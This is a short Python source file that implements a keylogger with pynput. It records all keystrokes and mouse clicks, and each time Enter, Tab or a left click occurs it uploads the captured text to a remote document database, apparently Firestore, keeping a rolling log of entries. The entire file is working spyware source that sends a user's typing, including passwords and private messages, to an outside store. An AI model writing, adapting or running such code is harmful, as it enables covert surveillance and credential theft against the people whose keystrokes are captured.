from pynput import keyboard
from pynput import mouse

class KeyLogger:
    def __init__(self, doc_ref):
        self.doc_ref = doc_ref
        self.log_entry = ''

        self.keyboard_listener = keyboard.Listener(on_press=self._on_press)
        self.keyboard_listener.start()

        self.mouse_listener = mouse.Listener(on_click=self._on_click)
        self.mouse_listener.start()

    def _on_press(self, key):
        if key == keyboard.Key.enter and self.log_entry != '':
            self._upload_log_data()
        elif key == keyboard.Key.tab and self.log_entry != '':
            self._upload_log_data()
        else:
            self.log_entry += self._get_key_text(key)

    def _on_click(self, x, y, button, pressed):
        if button == mouse.Button.left and pressed and self.log_entry != '':
            self._upload_log_data()

    def _get_key_text(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char
        elif key == keyboard.Key.space:
            return ' '
        return ''

    def _upload_log_data(self):
        doc_snapshot = self.doc_ref.get()
        doc_data = doc_snapshot.to_dict()
        if doc_data is None:
            doc_data = {
                'max_keylog_length': 20,
                'keylog': []
            }
        print(doc_data)

        max_keylog_length = doc_data['max_keylog_length']
        if max_keylog_length is None:
            max_keylog_length = 20

        log_data = doc_data['keylog']
        if log_data is None:
            log_data = []

        log_data.append(self.log_entry)

        if len(log_data) > max_keylog_length:
            log_data.pop(0)

        if doc_snapshot.exists:
            self.doc_ref.update({'keylog': log_data, 'max_keylog_length': max_keylog_length})
        else:
            self.doc_ref.set({'keylog': log_data, 'max_keylog_length': max_keylog_length})
        self.log_entry = ''
